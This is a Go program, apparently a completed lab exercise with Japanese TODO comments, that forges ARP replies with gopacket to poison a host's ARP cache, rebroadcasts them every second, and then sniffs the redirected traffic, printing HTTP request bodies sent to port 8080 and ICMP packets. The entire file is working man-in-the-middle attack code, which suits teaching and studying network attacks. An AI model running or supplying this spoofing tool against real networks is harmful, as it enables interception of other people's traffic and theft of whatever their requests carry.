package main

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"strings"
	"time"
)

type nwDevice struct {
	macAddr  net.HardwareAddr
	ipv4Addr net.IP
}

func getInterface(ifname string) nwDevice {
	netifs, _ := net.Interfaces()
	for _, netif := range netifs {
		if netif.Name == ifname {
			addrs, _ := netif.Addrs()
			for _, addr := range addrs {
				if !strings.Contains(addr.String(), ":") && strings.Contains(addr.String(), ".") {
					ip, _, _ := net.ParseCIDR(addr.String())
					return nwDevice{
						macAddr:  netif.HardwareAddr,
						ipv4Addr: ip,
					}
				}
			}

		}
	}
	return nwDevice{}
}

func parseMac(macaddr string) net.HardwareAddr {
	parsedMac, _ := net.ParseMAC(macaddr)
	return parsedMac
}

func main() {
	var iface = flag.String("i", "eth0", "Interface to read packets from")
	flag.Parse()

	netif := getInterface(*iface)

	ethernet := &layers.Ethernet{
		SrcMAC:       netif.macAddr,
		DstMAC:       parseMac("FF:FF:FF:FF:FF:FF"),
		EthernetType: layers.EthernetTypeARP,
	}
	// Todo: ARPスプーフィングをするリプライを作成してください
	arpreply := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   netif.macAddr,
		SourceProtAddress: []byte{192, 168, 1, 3},
		DstHwAddress:      []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstProtAddress:    []byte{192, 168, 1, 2},
	}
	packetbuf := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(
		packetbuf,
		gopacket.SerializeOptions{
			FixLengths: true,
		},
		ethernet,
		arpreply)
	if err != nil {
		log.Fatalf("create packet err : %v", err)
	}
	handle, err := pcap.OpenLive(*iface, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	// Todo: ARPリプライを送信し続けてください
	fmt.Println("start ARP spoofing...")
	go func() {
		for {
			time.Sleep(1000 * time.Millisecond)
			handle.WritePacketData(packetbuf.Bytes())
		}
	}()

	// Todo: ICMPを受信してください
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			tcp, _ := tcpLayer.(*layers.TCP)
			if len(tcp.Payload) != 0 && tcp.DstPort == 8080 {
				fmt.Printf("HTTP Request is %s\n", string(tcp.Payload))
			}
		} else if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
			fmt.Printf("ICMP is %+v\n", icmpLayer)
		}
	}

}
